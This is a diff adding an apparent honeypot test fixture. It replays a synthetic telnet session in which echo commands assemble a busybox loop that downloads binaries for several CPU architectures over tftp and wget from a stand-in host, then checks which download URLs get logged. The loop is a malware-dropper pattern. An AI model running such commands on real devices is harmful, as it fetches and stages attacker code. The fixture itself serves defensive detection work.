@@ -1,0 +1,22 @@
+# The busybox form of the same echo-assembled loop: each architecture is asked for by tftp and then
+# by wget, neither is run, so the loop goes round every name. The script text carries `$a` and no
+# download event; the line that runs it reports the expanded URLs in the order they were fetched.
+# source: synthetic reproduction of a busybox tftp/wget arch loop in the style seen 2026-10-08
+# date: 2026-10-08
+# protocol: telnet
+# persona: ubuntu
+$ echo 'for a in mips mpsl arm7; do' > /tmp/.l
+@downloads
+@events 1
+$ echo 'busybox tftp -g -l /tmp/.t -r $a 198.51.100.9' >> /tmp/.l
+@downloads
+@events 1
+$ echo 'busybox wget -q http://198.51.100.9/$a -O /tmp/.w' >> /tmp/.l
+@downloads
+@events 1
+$ echo 'done' >> /tmp/.l
+@downloads
+@events 1
+$ sh /tmp/.l
+@downloads tftp://198.51.100.9/mips http://198.51.100.9/mips tftp://198.51.100.9/mpsl http://198.51.100.9/mpsl tftp://198.51.100.9/arm7 http://198.51.100.9/arm7
+@events 7
